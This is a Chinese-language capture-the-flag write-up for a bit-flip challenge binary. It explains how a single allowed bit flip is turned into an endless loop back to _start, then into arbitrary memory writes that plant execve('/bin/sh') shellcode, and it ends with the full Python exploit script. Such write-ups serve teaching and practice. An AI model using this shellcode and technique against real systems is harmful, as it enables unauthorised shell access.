# 超精准的宇宙射线模拟器

首先拖到 ida 里看一眼，然后发现 ida 并不认识这个程序里的一部分结构，没办法正常把导入的函数对应上。（这个地方我现在还不清楚是怎么弄的，难道 7.0 的问题？

这个时候就只能借助 ghidra 了，导入后发现 ghidra 反编译就没有任何问题。

分析代码逻辑后发现，程序可以对任意内存的任意一位进行翻转，然后就会直接退出，因此唯一能做的就是找一下应该怎么翻转这一位。

扔掉反编译结果，直接看了一下汇编代码：

![image](https://user-images.githubusercontent.com/861659/98482875-a0c1a600-2247-11eb-9c79-127ae48ba50c.png)

翻转后只能调用 `puts` 打印一行 done 然后 `exit(0)`，连 ret 的地方都不给。那看来只能在这两个 call 上做文章了。分析了一下第一行 call 的地址附近发现下面就是程序开始的地方 `_start`，地址是 `4010D0`，和 `exit` 的 `4010C0`只差了一点，尝试后发现 `401296` 地点的 `26` 改成 `36` 即可使程序跳回 `_start`：

![image](https://user-images.githubusercontent.com/861659/98483009-863bfc80-2248-11eb-92a2-f92ac3e125c3.png)

这样一来我们能做的就不止是翻转一位了，而是可以任意重复执行程序直到我们玩腻了为止（或者服务器不耐烦了 kill 掉了连接）。于是我们可以利用这一点任意改写程序内存，对解题来说只需要写一个 shellcode 进去然后跳过去即可。不过在写之前我们需要考虑 shellcode 写到哪比较好，因为我们当前的程序逻辑依赖了 `_start` 的地方，所以原来的 `exit` 所在地点只有 16 字节的空间，这点空间是放不下 shellcode 的，只能另找地方。（看了题解发现这个原因在于我循环找的地方太远了，不过 it works（

分析程序内存后发现 `401020` 到 `40107F` 之间的空间都可以任意覆盖，从 `401080` 开始就是需要用到的库函数了。因此我们需要找到下一个跳转点。

尝试后发现，把 `40108C` 的 `F0` 改成 `D0` 即可让程序调用 `401060`，而这个地方有 32 字节的空间，够我们放下一个能用的 shellcode。

之后只需要写个代码自动生成一下所有需要的反转命令然后打过去就可以了。

最终代码：

```py
shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
original = b"\xF3\x0F\x1E\xFA\x68\x03\x00\x00\x00\xF2\xE9\xB1\xFF\xFF\xFF\x90\xF3\x0F\x1E\xFA\x68\x04\x00\x00\x00\xF2\xE9\xA1\xFF\xFF\xFF\x90"


def flip(addr, bit):
    return "0x%x %d\n" % (addr, bit)

def generate_flips():
    commands = ""
    # set up infi loop
    commands += flip(0x401296, 4)
    # set up shellcode at 0x401060
    for i in range(len(shellcode)):
        for j in range(8):
            if (shellcode[i] >> j) & 1 != (original[i] >> j) & 1:
                commands += flip(0x401060 + i, j)
    # call shellcode
    commands += flip(0x40128c, 5)
    return commands


def main():
    print(generate_flips())

if __name__ == '__main__':
    main()
```